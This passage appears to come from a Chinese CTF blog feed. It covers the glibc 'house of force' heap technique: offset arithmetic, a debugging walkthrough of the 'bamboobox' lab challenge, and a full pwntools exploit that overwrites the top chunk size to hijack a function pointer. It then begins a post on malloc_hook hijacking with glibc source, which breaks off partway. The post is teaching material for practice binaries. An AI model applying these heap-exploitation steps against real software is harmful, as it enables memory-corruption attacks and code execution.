(victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">/*这边也给出chunk_at_offset (victim, nb)这个宏定义*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">mchunkptr</span>;</span></span><br></pre></td></tr></table></figure><ul><li>这时我们再申请一个堆块，该堆块的<code>prev_size</code>和<code>size</code>就是<code>top_chunk</code>申请之前的<code>prev_size</code>和<code>size</code>，而用户使用的内存空间的起始地址就为字符串<code>This is a string that we want to overwrite.</code>的起始地址，这样我们就可以对该地址中的内容进行修改。</li><li>就像图中这样我们使用<code>malloc</code>申请了<code>100</code>字节大小的堆块，这样我们就可以修改字符串了</li></ul><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250212000130436.png" alt="image-20250212000130436"></p><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250212000355249.png" alt="image-20250212000355249"></p><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250212000637163.png" alt="image-20250212000637163"></p><h1 id="利用方式"><a class="markdownIt-Anchor" href="#利用方式"></a> 利用方式</h1><ul><li><p><code>house of force</code>的这个利用方式并不用伪造堆块，而是通过堆溢出对<code>top_chunk</code>的<code>size</code>位进行修改。然后通过计算<code>top_chunk</code>与<code>目标地址的偏移</code>，从而达到申请任意地址，从而可以造成任意地址写的效果。</p></li><li><p>这个漏洞利用方式需要的条件：</p><ul><li><code>堆溢出</code>漏洞，这样就可以修改<code>top_chunk</code>的size位</li><li><code>堆地址</code>，我们需要计算偏移就需要堆地址，如果我们要申请到栈上，这时还需要泄露<code>栈上的地址</code>。</li><li>如果申请到<code>bss</code>段：需要<code>malloc()</code>能传参数为负值，如果是申请到栈段则<code>malloc()</code>就需要传递很大的值</li></ul></li><li><p>我们计算偏移需要这样计算：</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">The evil_size is calulcated <span class="title function_">as</span> <span class="params">(nb is the number of bytes requested + space <span class="keyword">for</span> metadata)</span>:</span><br><span class="line">new_top = old_top + nb</span><br><span class="line">nb = new_top - old_top</span><br><span class="line">req + <span class="number">2</span><span class="keyword">sizeof</span>(<span class="type">long</span>) = new_top - old_top</span><br><span class="line">req = new_top - old_top - <span class="number">2</span><span class="keyword">sizeof</span>(<span class="type">long</span>)</span><br><span class="line">req = dest - <span class="number">2</span><span class="keyword">sizeof</span>(<span class="type">long</span>) - old_top - <span class="number">2</span><span class="keyword">sizeof</span>(<span class="type">long</span>)</span><br><span class="line">req = dest - old_top - <span class="number">4</span>*<span class="keyword">sizeof</span>(<span class="type">long</span>)</span><br><span class="line"># 我们要申请的地址就是req = dest - old_top - <span class="number">4</span>*<span class="keyword">sizeof</span>(<span class="type">long</span>)</span><br></pre></td></tr></table></figure><h1 id="house-of-force_level1"><a class="markdownIt-Anchor" href="#house-of-force_level1"></a> house-of-force_level1</h1><ul><li>题目来源：hitcontraning_lab11</li></ul><h2 id="level1分析1"><a class="markdownIt-Anchor" href="#level1分析1"></a> level1分析1</h2><ul><li>先使用查看一下附件的保护机制。发现是开了<code>canary</code>保护，没有开启PIE保护。</li></ul><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250212143154523.png" alt="image-20250212143154523"></p><ul><li>接下啦我们反编译一下程序，还是老样子先来查看一下<code>main</code>函数<ul><li>该程序的<code>main</code>函数，会先初始化输入输出</li><li>然后会申请一个堆块，这个堆块是由于存储两个函数地址</li><li>然后会调用<code>hello_message</code>函数，输出欢迎用户的信息</li><li>之后调用就是进入循环经典堆菜单题目</li><li>这里也给出<code>hello_message</code>、<code>goodbye_meeage</code>这两个函数输出的具体信息</li></ul></li></ul><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250212143503208.png" alt="image-20250212143503208"></p><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250212143733024.png" alt="image-20250212143733024"></p><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250212143757823.png" alt="image-20250212143757823"></p><ul><li>接下来我们查看一下菜单，这时就表面：<ul><li><code>1</code>展示数据</li><li><code>2</code>添加数据</li><li><code>3</code>修改数据</li><li><code>4</code>移除数据</li><li><code>5</code>退出</li></ul></li></ul><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250212143808000.png" alt="image-20250212143808000"></p><ul><li>现在我们依照<code>增删改查</code>的顺序查看这个堆块，在做堆题一般是先查看<code>add</code>这样我们会更熟悉申请堆块中堆块位置存储的具体数据</li><li>我们先来查看一下<code>add_item()</code>：<ul><li>首先介绍一下三个全局变量，其中<code>num</code>、<code>ptr_array</code>、<code>itemlist</code><ul><li><code>num</code>：统计着我们申请堆块的次数</li><li><code>ptr_array</code>：是一个指针数组，这个数组存储着malloc返回的堆地址</li><li><code>itemlist</code>：是一个<code>int</code>类型的数组,这个数组，存储着每个堆块所申请的大小</li></ul></li><li>该程序先对<code>num</code>进行检查，然后用户可以输入要申请堆块的大小（堆块大小不能为0）</li><li>之后程序就会申请一个堆块，申请完后会让用户输入内容，并在最后添加<code>\x00</code></li><li>最后<code>num</code>这个全局变量会自增</li><li>注：这里的<code>ptr+array+2*i</code>还不知道这个地址如何增加，之后动调看看</li></ul></li></ul><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250212145117877.png" alt="image-20250212145117877"></p><ul><li>接下来查看<code>remove_item()</code>：<ul><li>该函数的功能就是释放堆块，输入我们要释放堆块的索引</li><li>然后释放相应堆块，并且将<code>ptr_array</code>对应位置设置为<code>0</code>，然后将<code>itemlist</code>对应位置也设置为<code>0</code></li><li>最后<code>num</code>自减</li></ul></li></ul><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250212145536356.png" alt="image-20250212145536356"></p><ul><li>接下来我们查看<code>change_item()</code>，程序的逻辑大致如下：<ul><li>我们先要选择我们要修改内容的堆块</li><li>之后输入我们要修改多少字节（这边可以造成堆溢出）</li><li>然后调用<code>read</code>函数对相应堆块内容进行修改</li></ul></li></ul><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250212145947815.png" alt="image-20250212145947815"></p><ul><li>接下来查看最后一个函数<code>show_item()</code>，查看一下具体逻辑：输出我们已经申请的所有堆块的相应和索引</li></ul><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250212150427261.png" alt="image-20250212150427261"></p><ul><li>这边我们还注意到一个<code>magic()</code>函数：这边会直接将flag输出</li></ul><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250212150530614.png" alt="image-20250212150530614"></p><h2 id="level1分析2"><a class="markdownIt-Anchor" href="#level1分析2"></a> level1分析2</h2><ul><li>这题并不能泄露堆地址，但是一开始我们申请了一个堆块用于存储函数指针，这样我们并不用泄露地址可以直接计算偏移，将<code>top_chunk</code>的位置给改到第一次我们<code>malloc(0x10)</code>这个堆块。</li><li>这样我们就可以劫持<code>goodbye_message()</code>为<code>magic()</code>，这样我们在退出的时候就可以得到flag</li><li>为了<code>magic()</code>能成功调用，我们就先在当前目录下创建一个<code>flag</code>文件，存储着<code>flag&#123;test_flag&#125;</code></li><li>接下来我们就来进行动态调试看看，这里我们先动调查看<code>0x6020C8</code>是如何存储malloc返回的指针，这时我们先创建两个堆块，这时我们就发现反编译的一个错误，其实<code>ptr_array</code>并不存在，只有<code>itemlist</code>存在，按照<code>申请的大小</code>、<code>堆块地址</code>这个顺序存储（但是这个对于我们这题的思路没啥影响）</li></ul><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250212153144903.png" alt="image-20250212153144903"></p><ul><li>所以我们就再尝试申请一个堆块，看看<code>top_chunk</code>和<code>des</code>的偏移,这时我们<code>add(0x10,b'aaaa')</code></li><li>发现我们写入的堆块如下图所示，同时我们可以计算我们要申请的堆块即偏移地址，也就是<code>des-top_chunk_addr-siezof(long long size)*4</code></li><li>即<code>0x1C06000-0x1C06040-0x20=-0x60</code></li></ul><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250212153524257.png" alt="image-20250212153524257"></p><ul><li>这时我们尝试不修改<code>top_chunk</code>能不能将<code>top_chunk</code>的起始地址修改为<code>0x1c06000</code>，发现会报错</li></ul><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250212154750639.png" alt="image-20250212154750639"></p><ul><li>所以我们在申请负索引的时候就要先修改<code>top_chunk</code>的<code>size</code>位，这时我们利用<code>edit()</code>修改了<code>top_chunk</code>的<code>size</code>位</li></ul><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250212155105634.png" alt="image-20250212155105634"></p><ul><li>这时我们再来申请负值，但是这里出现段错误，也就是这段程序这边出现了问题，这边出现的错误情况是我们申请的堆块太小，导致我们的申请负堆块（如果用无符号整数表示就非常大），这时就会导致失败。</li><li>还有就是如果我们没有改变<code>top_chunk</code>的<code>size</code>位，也会导致报错（所以这时就需要改变<code>top_chunk</code>的size位为<code>-1</code>）</li></ul><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250212161907903.png" alt="image-20250212161907903"></p><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250212160319124.png" alt="image-20250212160319124"></p><ul><li>所以我们现在先申请一个<code>0x100</code>大小的堆块，然后再修改，计算偏移后再申请负值的堆块，结果就会如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x100</span>+<span class="number">0x10</span>,payload)</span><br><span class="line">add(-(<span class="number">0x100</span>+<span class="number">0x10</span>)-(<span class="number">0x10</span>+<span class="number">0x10</span>)-<span class="number">0x10</span>,<span class="string">b&#x27;aa&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250212212449635.png" alt="image-20250212212449635"></p><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250212212500567.png" alt="image-20250212212500567"></p><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250212212526653.png" alt="image-20250212212526653"></p><ul><li>这个时候就会出现<code>top_chunk</code>的起始地址会在我们这两个函数指针所在堆块的起始地址</li><li>这时我们再申请一个<code>0x10</code>大小的堆块，并修改<code>goodbye_message()</code>这个函数指针即值为<code>0x4008b1</code>将其修改为<code>magic()</code>这个函数的地址<code>0x400D49</code></li></ul><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250212212618493.png" alt="image-20250212212618493"></p><ul><li>这时我们再进行退出，这时就会调用<code>0x400D49</code>这个函数即<code>magic()</code></li></ul><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250212212952487.png" alt="image-20250212212952487"></p><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250212213117354.png" alt="image-20250212213117354"></p><ul><li>这时退出就会打印出<code>flag</code>的值</li></ul><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250212213206310.png" alt="image-20250212213206310"></p><h2 id="level1_exp"><a class="markdownIt-Anchor" href="#level1_exp"></a> level1_exp</h2><ul><li>exp：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;neww&quot;</span>]</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./bamboobox&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Please enter the length of item name:&#x27;</span>,<span class="built_in">str</span>(size).encode(<span class="string">&#x27;utf-8&#x27;</span>))    <span class="comment">#p.sendafter(b&#x27;Please enter the name of item:&#x27;,context)</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Please enter the name of item:&#x27;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Please enter the index of item:&#x27;</span>,<span class="built_in">str</span>(index).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Please enter the length of item name:&#x27;</span>,<span class="built_in">str</span>(size).encode(<span class="string">&#x27;utf-8&#x27;</span>))    <span class="comment">#p.sendafter(b&#x27;Please enter the new name of the item:&#x27;,context)</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Please enter the new name of the item:&#x27;</span>,context)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Please enter the index of item:&#x27;</span>,<span class="built_in">str</span>(index).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x100</span>+<span class="number">0x10</span>,payload)</span><br><span class="line">add(-(<span class="number">0x100</span>+<span class="number">0x10</span>)-(<span class="number">0x10</span>+<span class="number">0x10</span>)-<span class="number">0x10</span>,<span class="string">b&#x27;aa&#x27;</span>)</span><br><span class="line">payload =p64(<span class="number">0</span>)+p64(<span class="number">0x400D49</span>)</span><br><span class="line">add(<span class="number">0x10</span>,payload)</span><br><span class="line">p.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="house-of-force_level2"><a class="markdownIt-Anchor" href="#house-of-force_level2"></a> house-of-force_level2</h1><h2 id="level2分析1"><a class="markdownIt-Anchor" href="#level2分析1"></a> level2分析1</h2><h2 id="level2分析2"><a class="markdownIt-Anchor" href="#level2分析2"></a> level2分析2</h2><h2 id="level2分析3"><a class="markdownIt-Anchor" href="#level2分析3"></a> level2分析3</h2><h2 id="level2exp"><a class="markdownIt-Anchor" href="#level2exp"></a> level2exp</h2><h1 id="利用失效"><a class="markdownIt-Anchor" href="#利用失效"></a> 利用失效</h1><ul><li>在<code>glibc2.29</code>加入了一个检测，<code>system_mem</code>这个记录程序向堆块申请的堆块总字节大小。</li><li>这个检查就导致了<code>house_of_fore</code>基本失效</li></ul><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250212003427114.png" alt="image-20250212003427114"></p>]]></content>
    
    
    <summary type="html">前言:今天牢了3小时的einherjar结束了脱了10天的堆进度。再学个malloc_hook就可以开始了</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="PWN" scheme="http://iyheart.github.io/categories/CTF/PWN/"/>
    
    
  </entry>
  
  <entry>
    <title>malloc_hook</title>
    <link href="http://iyheart.github.io/2025/01/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/malloc-hook/"/>
    <id>http://iyheart.github.io/2025/01/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/malloc-hook/</id>
    <published>2025-01-25T12:16:34.000Z</published>
    <updated>2025-02-10T16:23:08.669Z</updated>
    
    <content type="html"><![CDATA[<ul><li><p>打堆的一个关键的方法就是劫持堆相关函数中的<code>hook</code>函数。即在堆中的三大<code>hook</code>函数，<code>malloc_hook</code>、<code>realloc_hook</code>、<code>free_hook</code></p></li><li><p>之前看<code>hook</code>利用的时候，感觉不是特别理解，所以就没有看了，今天感觉有点开窍了，就来学习一下，感觉这个学期都没怎么学pwn，学的pwn没有上学期多。参考博客：<a href="https://seanachao.github.io/2020/07/13/hook%E5%8A%AB%E6%8C%81/">malloc_hook以及free_hook劫持原理 | S3cana’s Blog</a>、<a href="https://grxer.github.io/2023/03/01/malloc-hook&amp;free-hook/">malloc_hook&amp;&amp;free_hook hijack原理</a></p></li></ul><h1 id="hook介绍"><a class="markdownIt-Anchor" href="#hook介绍"></a> hook介绍</h1><ul><li><p><code>hook</code>的就是劫持函数指针，控制程序的执行，让函数执行我们所指定的函数。</p><ul><li><code>hook</code>翻译过来是<code>钩子</code>。假设<code>a</code>函数中有这样一个执行过程：<code>判断b函数指针是否为空，如果不为空就先b函数指针所指向的函数</code>。这样当我们使用<code>b</code>钩子的时候，我们在执行<code>a</code>函数，执行流就会被<code>b</code>钩子给钩过来，这样就达到了执行<code>b</code>函数指针所指向的函数地址。</li></ul></li><li><p>为了方便调试程序，在<code>glibc</code>中有四个比较重要的函数指针，分别是<code>malloc_hook</code>、<code>free_hook</code>、<code>realloc_hook</code>、<code>exit_hook</code>。</p></li><li><p>我们可以通过一些堆漏洞或者其他漏洞就可以将原本指向<code>NULL</code>的这些函数指针，修改为<code>one_gadget</code>，这样我们在满足一定的条件后就可以<code>getshell</code>，这样就是pwn中的劫持<code>hook</code>函数最常见的用法。</p></li><li><p>之后由于<code>hook</code>的存在着比较严重的漏洞利用，在<code>glibc2.34</code>版本及以上就被删除了，所以<code>glibc2.34</code>版本及以上的<code>pwn</code>就不能往劫持这些<code>hook</code>函数去想了。</p></li></ul><h1 id="前置知识"><a class="markdownIt-Anchor" href="#前置知识"></a> 前置知识</h1><ul><li>这里可以先去了解一下函数指针。不了解其实也没关系，也就把他当做指针就行。</li><li>这里我是在已经有读一些glibc源码的基础上才学的<code>malloc_hook</code>技术，前置知识可能不太基础。</li></ul><h2 id="malloc函数流程"><a class="markdownIt-Anchor" href="#malloc函数流程"></a> malloc函数流程</h2><ul><li>通过阅读malloc函数的源码，大致总结出了malloc函数的执行流程，流程图如下</li></ul><p><img src="/2025/01/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/malloc-hook/malloc%E5%87%BD%E6%95%B0%E6%B5%81%E7%A8%8B.png" alt="malloc函数流程"></p><h2 id="malloc函数相关源码"><a class="markdownIt-Anchor" href="#malloc函数相关源码"></a> malloc函数相关源码</h2><ul><li>还是以glibc2.23的malloc相关源码</li></ul><details>    <summary>__libc_malloc</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*------------------------ Public wrappers. --------------------------------*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc (<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *(*hook) (<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">     before.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    (<span class="type">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__libc_malloc)</span><br></pre></td></tr></table></figure></details><details>    <summary>_int_malloc</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span 